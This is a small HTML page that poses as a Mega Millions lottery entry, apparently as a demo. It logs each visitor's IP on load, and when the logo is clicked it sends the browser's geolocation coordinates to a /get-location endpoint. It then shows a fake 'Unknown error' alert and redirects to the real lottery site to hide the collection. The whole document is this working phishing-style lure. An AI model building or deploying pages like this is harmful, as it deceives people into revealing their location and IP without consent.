<!DOCTYPE html>
<html>

<head>
  <title>megamillions</title>
</head>

<body class = "B" onload = "getIP()">

  <img class = "I" src = "lottery.png" alt = "Pretend this is a logo" onclick = "getLocation()">

  <h1>Click the logo now to enter draw! </h1>

  <script>
    function getLocation() {

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, locationError);
        
      } else {
        console.warn("Cannot get coordinates on browser");
      }
      alert("Unknown error")
      window.location.href = "https://www.megamillions.com";
    }

    function locationError() {
      console.warn(`Location error`);
    }

    function getIP() {

      fetch("/get-location", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({})
      })
        .then(response => response.text())
        .then(message => {console.log(message)})
        .catch(err => {
          console.error("Error: ", err);
        });

    }

    function showPosition(position) {

      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
  
      const data = {
        latitude: latitude,
        longitude: longitude,
      };

      fetch("/get-location", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(data),
      })
        .then((response) => response.text())
        .then((message) => {console.log(message)})
        .catch((err) => {
          console.error("Error:", err);
        });

    }
  </script>

</body>
</html>
